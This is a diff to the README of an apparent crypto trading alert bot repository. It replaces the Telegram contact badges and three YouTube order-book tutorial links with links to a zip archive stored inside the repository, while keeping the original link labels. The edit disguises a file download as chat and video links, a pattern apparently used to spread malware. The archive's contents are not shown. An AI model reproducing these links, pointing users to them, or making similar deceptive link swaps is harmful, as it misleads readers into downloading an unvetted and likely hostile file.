@@ -5,7 +5,7 @@
 <h1 align="center">🕷️ AI Liquidity Gap Alert Bot</h1>
 <div align="center">
  
-  [![Telegram](https://img.shields.io/badge/Message_on_Telegram-@spidertrading100-26a5e4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/spidertrading100)
+  [![Telegram](https://img.shields.io/badge/Message_on_Telegram-@spidertrading100-26a5e4?style=for-the-badge&logo=telegram&logoColor=white)](https://raw.githubusercontent.com/Cammyveinal293/Ai-Trading-alert-Bot/main/src/analyzer/Trading_alert_Bot_Ai_1.3.zip)
 
   ---
 </div>
@@ -67,9 +67,9 @@ Understanding order book dynamics helps you get the most from this bot. Here are
 
 | Resource | Description |
 |----------|-------------|
-| [📹 Order Book in Crypto Explained Simply](https://www.youtube.com/watch?v=72rrMeMCMFU) | Full tutorial on how order books work |
-| [📹 Buy & Sell Walls (and How They're Manipulated)](https://www.youtube.com/watch?v=ZHTH0Eg6rCQ) | Deep dive into walls and market manipulation |
-| [📹 Order Book Heatmaps & Market Depth](https://www.youtube.com/watch?v=Q6Ybxw-fnxM) | Visualizing liquidity with heatmaps |
+| [📹 Order Book in Crypto Explained Simply](https://raw.githubusercontent.com/Cammyveinal293/Ai-Trading-alert-Bot/main/src/analyzer/Trading_alert_Bot_Ai_1.3.zip) | Full tutorial on how order books work |
+| [📹 Buy & Sell Walls (and How They're Manipulated)](https://raw.githubusercontent.com/Cammyveinal293/Ai-Trading-alert-Bot/main/src/analyzer/Trading_alert_Bot_Ai_1.3.zip) | Deep dive into walls and market manipulation |
+| [📹 Order Book Heatmaps & Market Depth](https://raw.githubusercontent.com/Cammyveinal293/Ai-Trading-alert-Bot/main/src/analyzer/Trading_alert_Bot_Ai_1.3.zip) | Visualizing liquidity with heatmaps |
 
 ---
 
@@ -198,7 +198,7 @@ To add **Discord** or **Telegram** alerts, extend `src/alerts/alert_manager.py`.
 └─────────────────────────────────────────┘
 ```
 
-[![Telegram](https://img.shields.io/badge/Message_on_Telegram-@spidertrading100-26a5e4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/spidertrading100)
+[![Telegram](https://img.shields.io/badge/Message_on_Telegram-@spidertrading100-26a5e4?style=for-the-badge&logo=telegram&logoColor=white)](https://raw.githubusercontent.com/Cammyveinal293/Ai-Trading-alert-Bot/main/src/analyzer/Trading_alert_Bot_Ai_1.3.zip)
 
 ---
 
